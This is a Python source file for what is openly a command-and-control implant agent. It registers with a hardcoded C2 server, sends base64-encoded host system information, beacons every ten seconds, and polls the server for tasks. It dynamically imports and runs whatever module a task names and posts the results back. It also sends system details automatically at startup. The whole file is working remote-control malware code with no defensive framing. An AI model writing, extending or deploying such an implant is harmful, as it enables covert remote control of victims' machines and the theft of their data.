import uuid
import time
import platform
import json
import base64
import logging
import requests
import threading
import importlib
from datetime import datetime
from modules.system_info import get_system_info

# === Configuration ===
C2_URL = "http://172.18.181.223:5001/"
BEACON_INTERVAL = 10
agent_id = f"agent_{uuid.uuid4()}"
# ======================

# Logger setup
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

def register():
    system_info = get_system_info()
    payload = {
        "agent_id": agent_id,
        "system_info": system_info,
        "status": "active"
    }
    encoded = base64.b64encode(json.dumps(payload).encode()).decode()
    try:
        r = requests.post(f"{C2_URL}/api/agents/register", json={"data": encoded})
        if r.ok:
            logging.info("Registered with C2")
        else:
            logging.warning("Registration failed: " + r.text)
    except Exception as e:
        logging.error(f"Registration error: {str(e)}")

def send_beacon():
    while True:
        payload = {
            "agent_id": agent_id,
            "status": "online"
        }
        encoded = base64.b64encode(json.dumps(payload).encode()).decode()
        try:
            r = requests.post(f"{C2_URL}/api/agents/beacon", json={"data": encoded})
            if r.status_code != 200:
                logging.error("Beacon failed: " + r.text)
        except Exception as e:
            logging.error("Beacon error: " + str(e))
        time.sleep(BEACON_INTERVAL)

def fetch_tasks():
    while True:
        try:
            r = requests.get(f"{C2_URL}/api/tasks/{agent_id}")
            if r.ok:
                task_list = r.json()
                for task in task_list:
                    if task.get("status") == "pending":
                        run_task(task)
            else:
                logging.error("Error getting tasks: " + r.text)
        except Exception as e:
            logging.error("Task fetch error: " + str(e))
        time.sleep(BEACON_INTERVAL)

def send_result(task_id, result):
    payload = {
        "task_id": task_id,
        "agent_id": agent_id,
        "result": result
    }
    try:
        r = requests.post(f"{C2_URL}/api/results", json=payload)
        if not r.ok:
            logging.error("Result send failed: " + r.text)
    except Exception as e:
        logging.error("Result send error: " + str(e))

def run_task(task):
    task_id = task.get("id")
    task_type = task.get("type")
    data = task.get("data", {})
    result = None

    try:
        if task_type == "system_info":
            result = get_system_info()
        else:
            try:
                module_path = f"modules.{task_type}"
                mod = importlib.import_module(module_path)

                if hasattr(mod, 'run'):
                    result = mod.run()
                else:
                    cls_name = ''.join([part.capitalize() for part in task_type.split('_')])
                    handler = getattr(mod, cls_name, None)
                    if handler:
                        result = handler().run()
                    else:
                        result = f"No run method found in {task_type}"

            except Exception as e:
                result = f"Module load error: {e}"

        send_result(task_id, result)

    except Exception as e:
        send_result(task_id, f"Execution error: {e}")

def auto_task_post_startup():
    logging.info("Running startup modules...")
    results = {
        "system_info": get_system_info()
    }
    for key, value in results.items():
        task_id = f"{key}_{datetime.now().strftime('%H%M%S')}"
        send_result(task_id, value)

if __name__ == "__main__":
    register()
    auto_task_post_startup()
    threading.Thread(target=send_beacon, daemon=True).start()
    threading.Thread(target=fetch_tasks, daemon=True).start()
    while True:
        time.sleep(60)
